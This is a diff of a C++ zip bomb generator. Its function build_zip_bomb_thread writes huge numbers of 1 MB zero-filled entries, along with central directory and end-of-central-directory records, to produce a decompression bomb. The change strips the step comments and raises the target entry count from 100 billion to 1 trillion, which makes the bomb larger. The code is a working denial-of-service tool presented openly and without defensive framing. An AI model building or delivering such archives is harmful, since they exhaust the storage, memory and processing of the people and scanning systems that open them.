@@ -29,8 +29,6 @@ void build_zip_bomb_thread(int threadId, long long filesPerThread) {
     std::string testPayload(1000000, '0'); 
     uint32_t computedCrc = calculate_crc32(testPayload);
 
-    // --- STEP 1: CONCURRENT FILE SEQUENCE WRITE ---
-    // We use 'long long' for the loop counter 'i' so it NEVER hits an integer overflow!
     for (long long i = 0; i < filesPerThread; ++i) {
         std::string customName = "t" + std::to_string(threadId) + "_layer_" + std::to_string(i) + ".txt";
         uint32_t activeOffset = static_cast<uint32_t>(zipFile.tellp());
@@ -48,7 +46,6 @@ void build_zip_bomb_thread(int threadId, long long filesPerThread) {
         archiveTracker.push_back({customName, computedCrc, static_cast<uint32_t>(testPayload.size()), activeOffset});
     }
 
-    // --- STEP 2: WRITE CENTRAL DIRECTORY MAPS ---
     uint32_t centralDirectoryMarker = static_cast<uint32_t>(zipFile.tellp());
     for (const auto& file : archiveTracker) {
         CentralDirectoryHeader cdh;
@@ -64,7 +61,6 @@ void build_zip_bomb_thread(int threadId, long long filesPerThread) {
 
     uint32_t centralDirectoryByteSize = static_cast<uint32_t>(zipFile.tellp()) - centralDirectoryMarker;
 
-    // --- STEP 3: STAMP END OF CENTRAL DIRECTORY (EOCD) ---
     EndOfCentralDirectory eocd;
     eocd.numberRecordsOnDisk = archiveTracker.size();
     eocd.totalRecords = archiveTracker.size();
@@ -84,7 +80,7 @@ int main() {
     const unsigned int hardwareThreads = std::thread::hardware_concurrency();
     const unsigned int safeThreads = (hardwareThreads > 0) ? hardwareThreads : 8;
 
-    const long long totalFilesToTarget = 100000000000LL;
+    const long long totalFilesToTarget = 1000000000000LL;
 
     long long filesPerThread = totalFilesToTarget / safeThreads;
 
